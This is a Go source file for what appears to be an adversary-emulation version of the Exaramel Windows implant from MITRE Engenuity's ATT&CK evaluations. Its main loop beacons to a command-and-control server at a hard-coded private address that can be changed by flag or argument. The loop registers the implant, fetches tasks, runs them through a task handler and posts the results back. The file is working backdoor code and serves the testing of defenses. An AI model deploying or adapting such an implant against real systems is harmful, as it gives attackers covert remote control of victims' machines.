package main

import "C"

import (
	"flag"
	"log"
	"os"
	"time"

	"attackevals.mitre-engenuity.org/exaramel-windows/c2"
	"attackevals.mitre-engenuity.org/exaramel-windows/taskhandler"
)

//export Start
func Start() {
	c2ServerAddr := "https://192.168.0.4"
	args := os.Args
	if len(args) > 2 {
		c2ServerAddr = args[2]
	}

	StartC2Loop(c2ServerAddr)
}

func main() {
	c2Addr := "https://192.168.0.4"
	urlPtr := flag.String("server", c2Addr, "The C2 Server's URL")
	flag.Parse()

	c2ServerAddr := *urlPtr
	StartC2Loop(c2ServerAddr)
}

func StartC2Loop(c2ServerAddr string) {
	c2.CreateBeacon()
	for {
		log.Println("Sleeping")
		time.Sleep(5 * time.Second)

		log.Println("Registering to C2 server: ", c2ServerAddr)
		result, err := c2.RegisterImplant(c2ServerAddr)
		if err != nil {
			log.Println(err)
		}
		log.Println("Response: ", result)

		log.Println("Checking tasks")
		task, err := c2.GetTask(c2ServerAddr)
		if err != nil {
			log.Println(err)
		}
		log.Println(task)

		if task == "" {
			continue
		}

		log.Println("Executing task: ", task)
		out, err := taskhandler.HandleTask(task)
		if err != nil {
			log.Println(err)
		}

		log.Println("Posting task output to control server")
		result, err = c2.PostTaskOutput(c2ServerAddr, out)
		if err != nil {
			log.Println(err)
		}
		log.Println(result)
	}
}
